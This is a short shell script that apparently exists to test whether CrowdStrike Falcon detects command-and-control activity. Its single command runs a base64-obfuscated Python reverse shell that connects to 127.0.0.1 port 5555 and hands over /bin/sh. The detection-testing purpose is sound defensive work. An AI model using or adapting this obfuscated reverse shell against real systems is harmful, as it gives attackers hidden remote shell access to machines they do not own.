#!/bin/sh

echo -e "\e[92mExecuting Command and Control via Remote Access Tools using obfuscated Python script. A Falcon Prevent action can kill the attempt"
python -c 'import base64;dec=base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNy4wLjAuMSIsNTU1NSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLSJdKTs=");eval(compile(dec,"<string>","exec"))'
